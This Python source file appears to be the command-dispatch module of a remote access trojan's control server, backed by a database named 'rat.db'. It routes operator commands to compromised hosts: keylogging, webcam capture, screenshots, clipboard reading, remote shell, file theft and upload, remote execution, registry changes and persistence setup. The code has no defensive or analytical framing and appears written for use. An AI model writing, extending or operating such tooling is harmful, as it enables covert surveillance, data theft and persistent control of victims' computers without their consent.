#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import time
from datetime import datetime
from typing import Dict, Optional, Callable, Any
import logging
from .client_handler import ClientHandler  # Assuming ClientHandler is in the same package

class CommandHandler:
    """Handler for processing and executing commands"""
    
    def __init__(self, client_handler: ClientHandler, logger: logging.Logger):
        """Initialize the command handler
        
        Args:
            client_handler: Client handler instance
            logger: Logger instance
        """
        self.client_handler: ClientHandler = client_handler
        self.logger: logging.Logger = logger
        
        # Command handlers dictionary
        self.command_types: Dict[str, Callable[[str, Optional[Dict]], Optional[int]]] = {
            'system_info': self.handle_system_info,
            'process_list': self.handle_process_list,
            'file_explorer': self.handle_file_explorer,
            'screenshot': self.handle_screenshot,
            'webcam': self.handle_webcam,
            'keylogger': self.handle_keylogger,
            'shell': self.handle_shell,
            'download': self.handle_download,
            'upload': self.handle_upload,
            'execute': self.handle_execute,
            'clipboard': self.handle_clipboard,
            'persistence': self.handle_persistence,
            'network': self.handle_network,
            'registry': self.handle_registry,
            'kill': self.handle_kill
        }
    
    def process_command(self, client_id: str, command_type: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Process a command for a client
        
        Args:
            client_id: Client ID
            command_type: Type of command to execute
            params: Command parameters
            
        Returns:
            Command ID or None if processing fails
        """
        try:
            if not self.client_handler.get_client(client_id):
                self.logger.error(f"Cannot process command for unknown client: {client_id}")
                return None
                
            if command_type not in self.command_types:
                self.logger.error(f"Unknown command type: {command_type}")
                return None
            
            handler = self.command_types[command_type]
            command_id = handler(client_id, params)
            
            if command_id is not None:
                self.logger.info(f"Processed command {command_type} for client {client_id} (ID: {command_id})")
            return command_id
            
        except Exception as e:
            self.logger.error(f"Error processing command {command_type} for client {client_id}: {e}")
            return None
    
    def handle_system_info(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle system info command"""
        return self.client_handler.add_command(client_id, 'system_info', params)
    
    def handle_process_list(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle process list command"""
        return self.client_handler.add_command(client_id, 'process_list', params)
    
    def handle_file_explorer(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle file explorer command"""
        try:
            client = self.client_handler.get_client(client_id)
            if not params or 'path' not in params:
                params = params or {}
                params['path'] = 'C:\\' if 'windows' in client.get('os', '').lower() else '/'
            
            return self.client_handler.add_command(client_id, 'file_explorer', params)
        except Exception as e:
            self.logger.error(f"Error handling file_explorer for client {client_id}: {e}")
            return None
    
    def handle_screenshot(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle screenshot command"""
        return self.client_handler.add_command(client_id, 'screenshot', params)
    
    def handle_webcam(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle webcam command"""
        params = params or {'capture': True}
        return self.client_handler.add_command(client_id, 'webcam', params)
    
    def handle_keylogger(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle keylogger command"""
        params = params or {'action': 'start'}
        if params.get('action') not in ['start', 'stop', 'logs', 'status']:
            self.logger.error(f"Invalid keylogger action: {params.get('action')}")
            return None
        return self.client_handler.add_command(client_id, 'keylogger', params)
    
    def handle_shell(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle shell command"""
        if not params or 'command' not in params or not params['command']:
            self.logger.error("Shell command requires 'command' parameter")
            return None
        return self.client_handler.add_command(client_id, 'shell', params)
    
    def handle_download(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle download command (download file from client)"""
        if not params or 'file_path' not in params or not params['file_path']:
            self.logger.error("Download command requires 'file_path' parameter")
            return None
        return self.client_handler.add_command(client_id, 'download', params)
    
    def handle_upload(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle upload command (upload file to client)"""
        if not params or 'file_data' not in params or 'file_path' not in params:
            self.logger.error("Upload command requires 'file_data' and 'file_path' parameters")
            return None
        if not params['file_data'] or not params['file_path']:
            self.logger.error("Upload parameters 'file_data' and 'file_path' cannot be empty")
            return None
        return self.client_handler.add_command(client_id, 'upload', params)
    
    def handle_execute(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle execute command (execute file on client)"""
        if not params or 'file_path' not in params or not params['file_path']:
            self.logger.error("Execute command requires 'file_path' parameter")
            return None
        return self.client_handler.add_command(client_id, 'execute', params)
    
    def handle_clipboard(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle clipboard command"""
        params = params or {'action': 'get'}
        if params.get('action') not in ['get', 'set']:
            self.logger.error(f"Invalid clipboard action: {params.get('action')}")
            return None
        if params.get('action') == 'set' and 'data' not in params:
            self.logger.error("Clipboard 'set' action requires 'data' parameter")
            return None
        return self.client_handler.add_command(client_id, 'clipboard', params)
    
    def handle_persistence(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle persistence command"""
        params = params or {'action': 'check'}
        if params.get('action') not in ['check', 'add', 'remove']:
            self.logger.error(f"Invalid persistence action: {params.get('action')}")
            return None
        return self.client_handler.add_command(client_id, 'persistence', params)
    
    def handle_network(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle network command"""
        params = params or {'action': 'connections'}
        return self.client_handler.add_command(client_id, 'network', params)
    
    def handle_registry(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle registry command (Windows only)"""
        try:
            client = self.client_handler.get_client(client_id)
            if not client or 'windows' not in client.get('os', '').lower():
                self.logger.error(f"Registry command only available for Windows clients (client: {client_id})")
                return None
            
            if not params or 'action' not in params or 'key' not in params:
                self.logger.error("Registry command requires 'action' and 'key' parameters")
                return None
                
            valid_actions = ['get', 'set', 'delete', 'create']
            if params.get('action') not in valid_actions:
                self.logger.error(f"Invalid registry action: {params.get('action')}")
                return None
                
            return self.client_handler.add_command(client_id, 'registry', params)
        except Exception as e:
            self.logger.error(f"Error handling registry command for client {client_id}: {e}")
            return None
    
    def handle_kill(self, client_id: str, params: Optional[Dict[str, Any]] = None) -> Optional[int]:
        """Handle kill command (terminate process)"""
        if not params or 'pid' not in params:
            self.logger.error("Kill command requires 'pid' parameter")
            return None
        try:
            pid = int(params['pid'])
            if pid < 0:
                raise ValueError("PID must be non-negative")
            return self.client_handler.add_command(client_id, 'kill', params)
        except (ValueError, TypeError) as e:
            self.logger.error(f"Invalid PID value: {params['pid']} - {e}")
            return None

if __name__ == "__main__":
    # Example usage
    import logging
    from client_handler import ClientHandler
    from database import Database
    
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    logger = logging.getLogger(__name__)
    
    # Initialize dependencies
    db_path = 'data/rat.db'
    db = Database(db_path)
    client_handler = ClientHandler(db, logger)
    cmd_handler = CommandHandler(client_handler, logger)
    
    # Register a test client
    client_id = client_handler.register_client({
        'hostname': 'test-host',
        'os': 'Windows 10',
        'username': 'testuser'
    })
    
    # Test some commands
    cmd_id = cmd_handler.process_command(client_id, 'system_info')
    print(f"System info command ID: {cmd_id}")
    
    cmd_id = cmd_handler.process_command(client_id, 'shell', {'command': 'dir'})
    print(f"Shell command ID: {cmd_id}")
    
    cmd_id = cmd_handler.process_command(client_id, 'download', {'file_path': 'C:\\test.txt'})
    print(f"Download command ID: {cmd_id}")
    
    cmd_id = cmd_handler.process_command(client_id, 'kill', {'pid': 1234})
    print(f"Kill command ID: {cmd_id}")
    
    # Cleanup
    db.close()